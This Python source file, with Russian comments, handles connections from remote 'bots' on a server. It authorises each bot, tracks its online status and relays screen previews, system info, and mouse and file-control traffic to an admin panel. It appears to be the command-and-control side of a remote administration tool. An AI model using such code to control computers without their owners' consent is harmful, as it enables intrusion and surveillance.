# backend/Core/ClientConnection.py
import json, asyncio, socket, logs.LoggerWrapper as logger
from backend.Core.network import read_packet, pack_packet
from backend.Services.Auth import authorize_bot, get_full_db
from backend.Services.ClientManager import active_clients
from backend.BenchUtils import add_bytes

preview_cache = {}

class BotConnectionHandler:
    async def handle_new_connection(self, reader, writer):
        bot_id, peer = None, writer.get_extra_info("peername")[0]
        if (sock := writer.get_extra_info('socket')): 
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        try:
            # 1. Авторизация
            res = await authorize_bot(reader, peer)
            if not res: return await self._force_close(writer)
            bot_id, bot_data = res
            
            # 2. Регистрация
            active_clients[bot_id] = (reader, writer)
            
            # Сразу пушим состояние БД всем админам (статус online)
            self._broadcast_db_state()
            
            if bot_id in preview_cache: 
                self._send_raw(preview_cache[bot_id])
                
            logger.Log.info(f"[+] Бот {bot_id} онлайн")

            # 3. Цикл обработки команд
            while True:
                try:
                    bid, mod, pay = await asyncio.wait_for(read_packet(reader), timeout=10.0)
                except asyncio.TimeoutError: break
                if not bid: break 
                
                add_bytes(6 + len(bid) + len(mod) + (len(pay) if isinstance(pay, bytes) else len(str(pay))))
                
                if mod == "Heartbeat":
                    if pay == "ping":
                        writer.write(pack_packet(bid, "Heartbeat", "pong"))
                        await writer.drain()
                
                elif mod == "SystemInfo":
                    from backend.Services.Auth import sync_bot_data
                    # Обновляем БД и пушим метаданные (is_json=True)
                    updated_data = sync_bot_data(bid, pay)
                    self._to_panel(bid, "SystemInfo", updated_data, is_json=True)
                
                elif mod == "Preview":
                    # Превью кешируем и шлем сырым пакетом
                    preview_cache[bid] = pack_packet(bid, mod, pay)
                    self._send_raw(preview_cache[bid])
                
                else:
                    # Модули управления (ScreenView, Mouse, Files) шлем КАК ЕСТЬ (бинарно)
                    self._to_panel(bid, mod, pay, is_json=False)

        except Exception as e: 
            logger.Log.error(f"Handler Err [{bot_id}]: {e}")
        finally: 
            await self._disconnect(bot_id, writer)

    def _broadcast_db_state(self):
        """Полная синхронизация БД (статусы всех ботов)"""
        from backend.API import manager
        from backend.Services.Auth import get_full_db
        db_data = get_full_db()
        
        bot_list = []
        for bid, info in db_data.items():
            info['status'] = 'online' if bid in active_clients else 'offline'
            info['id'] = bid
            bot_list.append(info)
            
        # БД — это всегда текстовые данные для фронта
        payload = json.dumps(bot_list, ensure_ascii=False)
        manager.broadcast_packet_sync(pack_packet("SERVER", "SystemInfo", payload))

    def _to_panel(self, bid, mod, pay, is_json=False):
        """Умный прокси: JSON для инфо, бинарно для модулей"""
        from backend.API import manager
        
        if is_json:
            # Текстовые данные пакуем в JSON строку
            try:
                payload = json.dumps(pay, ensure_ascii=False)
            except:
                payload = str(pay)
        else:
            # Бинарные данные (картинки, файлы) оставляем байтами
            payload = pay
            
        manager.broadcast_packet_sync(pack_packet(bid, mod, payload))

    def _send_raw(self, full_packet):
        from backend.API import manager
        manager.broadcast_packet_sync(full_packet)

    async def _disconnect(self, bid, writer):
        if bid in active_clients:
            active_clients.pop(bid)
            from backend.Services.Auth import sync_bot_data
            sync_bot_data(bid, {"status": "offline"})
            self._broadcast_db_state() 
            logger.Log.warning(f"[-] Бот {bid} отключился")
        await self._force_close(writer)

    async def _force_close(self, writer):
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), 1)
        except: pass